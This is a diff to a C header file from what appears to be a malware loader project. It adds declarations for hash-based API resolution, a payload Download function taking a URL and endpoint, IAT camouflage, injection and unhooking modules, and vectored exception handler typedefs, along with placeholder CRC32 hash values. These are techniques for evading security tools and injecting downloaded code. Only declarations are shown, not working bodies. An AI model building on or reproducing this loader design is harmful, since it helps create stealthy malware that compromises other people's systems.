@@ -9,6 +9,7 @@ extern PSTR url;
 extern PSTR endpoint;
 extern SIZE_T sSize;
 
+
 // winapi.c
 #define INITIAL_SEED	8
 
@@ -30,8 +31,20 @@ typedef struct _API_HASHING {
 	fnLoadLibraryA					pLoadLibraryA;
 } API_HASHING, * PAPI_HASHING;
 
-// inject.c
+typedef void*(NTAPI* fnAddVectoredExceptionHandler)(
+        ULONG                       First,
+        PVECTORED_EXCEPTION_HANDLER Handler
+);
 
+typedef long(NTAPI* fnRemoveVectoredExceptionHandler)(
+        PVOID Handle
+);
+
+// inject.c
+#include "inject.h"
+
+//unhook.c
+#include "unhook.h"
 
 // apihashing.c
 FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
@@ -45,3 +58,9 @@ DWORD Download(char** response, PVOID url, PVOID endpoint, BOOL ssl);
 
 //iatcamo.c
 VOID IatCamouflage();
+
+//dllmain.c
+
+#define kernel32dll_CRC32 0x00
+#define AddVectoredExceptionHandler_CRC32 0x00
+#define RemoveVectoredExceptionHandler_CRC32 0x00
